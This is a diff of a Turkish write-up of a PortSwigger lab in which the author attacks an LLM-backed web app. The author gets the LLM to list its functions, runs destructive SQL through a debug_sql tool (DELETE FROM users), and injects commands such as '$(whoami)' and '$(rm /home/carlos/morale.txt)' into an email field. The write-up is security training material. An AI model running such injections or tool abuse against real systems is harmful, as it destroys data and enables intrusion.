@@ -10,9 +10,7 @@ LLM'e eriştiği fonksiyonları sordum: password_reset, subscribe_to_newsletter,
 
 Ekran görüntüsü: Fonksiyon keşfi — LLM'in eriştiği fonksiyonları listelemesi.
 
-
-
-
+![Fonksiyon keşfi](lab2ss%20son.png)
 
 Çözüm — SQL Injection (debug_sql)
 
@@ -28,14 +26,9 @@ DELETE FROM users WHERE username = 'carlos'
 
 LLM "carlos has been successfully deleted" yanıtını verdi — lab çözüldü.
 
-Ekran görüntüsü: debug_sql ile SELECT * FROM users → carlos'un bilgileri → DELETE ile silme.
+debug_sql ile SELECT * FROM users → carlos'un bilgileri → DELETE ile silme.
 
-
-
-
-
-
-
+![debug_sql ile carlos'u silme](poertswiger%20lab2ss1.png)
 
 
 Ek araştırma — OS Command Injection (RCE doğrulandı, tamamlanmadı)
@@ -48,15 +41,17 @@ $(whoami)@exploit-<id>.exploit-server.net
 
 Email client'ta gelen mail customer@exploit-... adresine gelmişti — yani $(whoami) komutu çalışmış ve kullanıcı adını döndürmüştü. Bu, RCE'nin mümkün olduğunu kanıtladı.
 
-Ekran görüntüsü: $(whoami) payload'ı ve mailin customer@ adresine gelmesi (RCE kanıtı).
+ $(whoami) payload'ı ve mailin customer@ adresine gelmesi (RCE kanıtı).
 
+
+![RCE kanıtı - whoami](portswiger%20lab2ss2.png)
 
 
 Dosya silme denemesi: Ardından $(rm /home/carlos/morale.txt) denedim, ancak sistem bu adresi "invalid" olarak reddetti ve oturum bir noktada disconnect oldu. Bu yolu sonuca ulaştıramadım.
 
-Ekran görüntüsü: $(rm ...) denemesi ve "invalid email" yanıtı.
+ $(rm ...) denemesi ve "invalid email" yanıtı.
 
-
+![rm denemesi - invalid email](portswiger%20lab2ss3.png)
 
 Not: LLM'in davranışı oturumdan oturuma değişti — bazı oturumlarda debug_sql'i sundu, bazılarında reddetti. Bu, canlı LLM'lerin öngörülemez doğasının iyi bir örneği.
 
